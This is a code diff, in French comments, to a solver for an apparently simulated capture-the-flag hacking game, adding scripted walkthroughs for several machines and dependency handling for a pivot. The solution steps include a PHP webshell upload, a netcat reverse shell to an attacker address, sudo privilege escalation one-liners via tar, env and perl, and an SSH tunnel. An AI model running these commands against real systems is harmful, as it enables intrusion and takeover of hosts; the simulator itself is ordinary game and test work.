@@ -98,6 +98,32 @@ const SOLUTIONS = {
     "echo copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\Temp\\svc.exe >> C:\\Scripts\\backup.bat",
     "whoami", "C:\\Windows\\Temp\\svc.exe", "type root.txt",
   ],
+  stratus: [
+    "nmap 10.10.11.120", "curl http://10.10.11.120/", "cloudctl ls",
+    "cloudctl ls s3://stratus-prod-backups", "cloudctl get s3://stratus-prod-backups/deploy.env",
+    "ssh dsomma@10.10.11.120", { pw: true }, "cat user.txt", "sudo -l", "sudo env /bin/sh",
+    "cat /root/root.txt",
+  ],
+  // NEXUS : accès par upload de webshell puis reverse shell (pas de mot de passe SSH).
+  // `exit` d'abord car on n'attrape une reverse shell que depuis sa propre box.
+  nexus: [
+    "exit", "nmap 10.10.11.135", "curl http://10.10.11.135/", "curl http://10.10.11.135/upload.php",
+    'curl -F "file=@shell.php" http://10.10.11.135/upload.php', "nc -lvnp 4444",
+    'curl "http://10.10.11.135/uploads/sh.php?cmd=nc 10.10.14.1 4444 -e /bin/sh"',
+    "cat user.txt", "sudo -l",
+    "sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh",
+    "cat /root/root.txt",
+  ],
+  // CITADEL : hôte interne. Sa solution officielle roote d'abord le pivot (NEXUS), puis
+  // ouvre un tunnel ssh -L. `deps` déclare cette dépendance pour le solveur.
+  citadel: {
+    deps: ["nexus"],
+    steps: [
+      "ssh -L 9022:172.16.20.10:22 root@10.10.11.135", "nmap 172.16.20.10",
+      "ssh dbadmin@172.16.20.10", { pw: true }, "cat user.txt", "sudo -l",
+      "sudo perl -e 'exec \"/bin/sh\";'", "cat /root/root.txt",
+    ],
+  },
   axiom: [
     "nmap 10.10.11.244", "curl http://10.10.11.244:8080/", "curl http://10.10.11.244:8080/logs/latest.txt",
     "ssh cibuild@10.10.11.244", { pw: true }, "cat user.txt", "sudo -l", "id", "docker ps",
@@ -114,21 +140,23 @@ function sshPassword(machine) {
 
 const C = { red: "\x1b[31m", green: "\x1b[32m", gray: "\x1b[90m", cyan: "\x1b[36m", bold: "\x1b[1m", reset: "\x1b[0m" };
 
-function solveMachine(id) {
-  const ctx = freshContext();
-  vm.runInContext("GAME.unlocked = MACHINES.map(m => m.id);", ctx);
-  const machine = get(ctx, `MACHINES.find(m => m.id === ${JSON.stringify(id)})`);
-  if (!machine) return { id, ok: false, reason: "machine inconnue" };
-  const steps = SOLUTIONS[id];
-  if (!steps) return { id, ok: false, reason: "aucune solution officielle définie" };
+// Normalise une entrée de SOLUTIONS (tableau simple ou { deps, steps }).
+function solutionOf(id) {
+  const s = SOLUTIONS[id];
+  if (!s) return null;
+  return Array.isArray(s) ? { deps: [], steps: s } : { deps: s.deps || [], steps: s.steps || [] };
+}
 
-  run(ctx, `use ${id}`);
-  if (verbose || walkthrough) console.log(`\n${C.bold}${C.cyan}▶ ${machine.name}${C.reset} ${C.gray}(${machine.difficulty} — ${machine.os})${C.reset}`);
-
+// Rejoue une séquence de commandes dans un contexte donné, en utilisant `machineObj`
+// pour résoudre les étapes { pw: true } (mot de passe SSH de CETTE machine).
+function playSteps(ctx, machineObj, steps, header) {
+  if ((verbose || walkthrough) && header) {
+    console.log(`\n${C.bold}${C.cyan}▶ ${machineObj.name}${C.reset} ${C.gray}(${machineObj.difficulty} — ${machineObj.os})${C.reset}`);
+  }
   let last = null;
   for (const step of steps) {
     if (typeof step === "object" && step.pw) {
-      const pw = sshPassword(machine);
+      const pw = sshPassword(machineObj);
       last = pass(ctx, pw);
       if (verbose) console.log(`  ${C.gray}[mot de passe SSH] ${pw}${C.reset}`);
       else if (walkthrough) console.log(`  ${C.gray}→ (mot de passe : ${pw})${C.reset}`);
@@ -142,6 +170,28 @@ function solveMachine(id) {
       console.log(`  ${mark} ${C.cyan}$ ${step}${C.reset}  ${C.gray}${preview}${C.reset}`);
     }
   }
+  return last;
+}
+
+function solveMachine(id) {
+  const ctx = freshContext();
+  vm.runInContext("GAME.unlocked = MACHINES.map(m => m.id);", ctx);
+  const machine = get(ctx, `MACHINES.find(m => m.id === ${JSON.stringify(id)})`);
+  if (!machine) return { id, ok: false, reason: "machine inconnue" };
+  const sol = solutionOf(id);
+  if (!sol) return { id, ok: false, reason: "aucune solution officielle définie" };
+
+  // Dépendances (ex. pivot) : on roote d'abord les machines requises dans le même contexte.
+  for (const depId of sol.deps) {
+    const depSol = solutionOf(depId);
+    const depMachine = get(ctx, `MACHINES.find(m => m.id === ${JSON.stringify(depId)})`);
+    if (!depSol || !depMachine) return { id, name: machine.name, ok: false, reason: `dépendance introuvable : ${depId}` };
+    if (verbose || walkthrough) console.log(`${C.gray}  … prérequis : rooter ${depMachine.name} d'abord${C.reset}`);
+    playSteps(ctx, depMachine, depSol.steps, true);
+  }
+
+  run(ctx, `use ${id}`);
+  const last = playSteps(ctx, machine, sol.steps, true);
 
   const p = get(ctx, `GAME.progress.${id}`);
   const milestones = ["recon", "access", "privesc", "userFlag", "rootFlag"];
